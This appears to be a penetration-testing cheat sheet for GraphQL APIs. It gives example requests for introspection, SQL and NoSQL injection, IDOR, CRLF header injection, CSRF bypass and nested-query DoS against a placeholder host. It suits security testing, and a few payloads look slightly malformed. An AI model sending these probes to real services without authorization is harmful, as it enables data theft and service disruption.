### Methodology for Attacking GraphQL [0xAwali](https://x.com/0xAwali)

1. **Setup and Tools**
   - **Install InQL in Burp Suite**
     - Download InQL from the [GitHub repository](https://github.com/doyensec/inql).
     - Load `inql.py` as a Python extension inside Burp Suite.
     - Switch to the InQL Scan Tab and enter your target (e.g., `https://www.company.com/graphql`).

2. **Introspection Query**
   - Try to find the introspection query to get all objects, which helps in exposing sensitive information:
     ```plaintext
     GET /graphql?query={__schema{types{name,fields{name}}}} HTTP/1.1
     Host: company.com
     User-Agent: Mozilla/5.0
     Referer: https://previous.com/path
     Origin: https://www.company.com
     ```

3. **Schema Visualization**
   - Use tools like [graphql-visualizer](http://nathanrandal.com/graphql-visualizer/) to view model relationships after obtaining the introspection query.
   - Steps:
     1. Copy the introspection query.
     2. Paste it into the introspection query field in the visualizer.

4. **Query Generation**
   - Use tools like [gql-generator](https://www.npmjs.com/package/gqlg) to generate a list of pasteable query strings:
     ```plaintext
     gqlg --schemaFilePath file.graphql --destDirPath output
     ```

5. **Verbose Results**
   - Append `?debug=1` to the URL of GraphQL to get more verbose results:
     ```plaintext
     POST /graphql?debug=1 HTTP/1.1
     Host: company.com
     Content-Length: Number

     query {
       user(name: "me ") {
         edges {
           node {
             phone
           }
         }
       }
     }
     ```

6. **Object Removal**
   - Attempt to remove objects to expose sensitive information:
     ```plaintext
     POST /graphql HTTP/1.1
     Host: company.com
     Content-Length: Number

     query {
       user(name: "me") {
         edges {
           node {
             phone
           }
         }
       }
     }
     ```

7. **SQL Injection**
   - **Basic SQL Injection**
     - Inject single quotes (`'`) or boolean-based payloads in all arguments:
       ```plaintext
       query {
         user(name: "me ' OR 1=1") {
           edges {
             node {
               phone
             }
           }
         }
       }
       ```
   - **Time-Based SQL Injection**
     - Inject payloads like `SELECT pg_sleep(30)`:
       ```plaintext
       query {
         user(name: "me ' SELECT pg_sleep(30);-- ") {
           edges {
             node {
               phone
             }
           }
         }
       }
       ```

8. **NoSQL Injection**
   - Inject NoSQLi payloads (e.g., `$gte`) in all arguments:
     ```plaintext
     query {
       user(name: "{\"me\":{\"$gte\":\"\"}}") {
         edges {
           node {
             phone
           }
         }
       }
     }
     ```

9. **IDOR (Insecure Direct Object References)**
   - Check for IDOR vulnerabilities:
     ```plaintext
     query {
       user(id: "ID-Of-Another-User") {
         edges {
           node {
             phone
           }
         }
       }
     }
     ```

10. **SSRF and CRLF Injection**
    - Inject Carriage Return Line Feed (`%0A%01%09`) with headers (e.g., `Host`, `X-Forwarded-Host`):
      ```plaintext
      query {
        user(name: "me%0A%01%09Host:%20me.com") {
          edges {
            node {
              phone
            }
          }
        }
      }
      ```

11. **Parameter Enumeration**
    - Append parameters to queries to expose sensitive information:
      ```plaintext
      query {
        user(name: "me") {
          edges {
            node {
              phone
              key
            }
          }
        }
      }
      ```

12. **CSRF (Cross-Site Request Forgery)**
    - Check for CSRF vulnerabilities:
      ```plaintext
      POST /graphql HTTP/1.1
      Host: company.com
      CSRF-Token: *********
      Content-Length: Number

      query {
        user(name: "me") {
          edges {
            node {
              phone
            }
          }
        }
      }
      ```

    - Try to bypass CSRF token validation by using GET queries:
      ```plaintext
      GET /graphql?query={user(name: "me"){node{phone}}} HTTP/1.1
      Host: company.com
      User-Agent: Mozilla/5.0
      Referer: https://previous.com/path
      Origin: https://www.company.com
      ```

13. **DoS Attack**
    - Inject repeated nodes in your body to perform a DoS attack:
      ```plaintext
      query {
        user {
          edges {
            user {
              ...
            }
          }
        }
      }
      ```

### References
- [GraphQL Abuse by Detectify Labs](https://labs.detectify.com/2018/03/14/graphql-abuse/)
- [GraphQL Bug to Steal Anyone's Address](https://blog.usejournal.com/graphql-bug-to-steal-anyones-address-fc34f0374417)
- [GraphQL Introspection Leads to Sensitive Data Disclosure](https://medium.com/@pranaybafna/graphql-introspection-leads-to-sensitive-data-disclosure-65b385452d7f)
- [Common Vulnerabilities in GraphQL](https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
